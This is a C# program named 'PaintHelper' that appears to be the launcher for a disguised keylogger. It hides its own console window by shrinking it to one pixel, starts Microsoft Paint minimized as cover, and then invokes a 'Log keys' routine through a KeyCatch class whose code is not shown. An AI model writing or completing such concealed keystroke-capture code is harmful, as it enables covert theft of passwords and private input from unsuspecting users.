using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;
using GregsStack.InputSimulatorStandard;

namespace PaintHelper
{
    class Program
    {
        public static InputSimulator simulator = new InputSimulator();
        static void Main(string[] args)
        {
            Console.WindowHeight = 1;
            Console.WindowWidth = 1;

            if (Process.GetProcesses().Where(x => x.ProcessName.Contains("mspaint")).Count() == 0)
            {
                //paint
                ProcessStartInfo paintProcess = new ProcessStartInfo()
                {
                    FileName = "mspaint.exe",
                    WindowStyle = ProcessWindowStyle.Minimized
                };
                Process.Start(paintProcess);
            }

            var selector = new Dictionary<string, Action<Action>>
            {
                {"1. Log keys", KeyCatch.Start}
            };
            Action<Action> action = null;
            action = selector.Where(p => p.Key.StartsWith("1"))
                .Select(p => p.Value).FirstOrDefault();

            action(Application.Exit);

            Application.Run(new ApplicationContext());
        }
    }
}
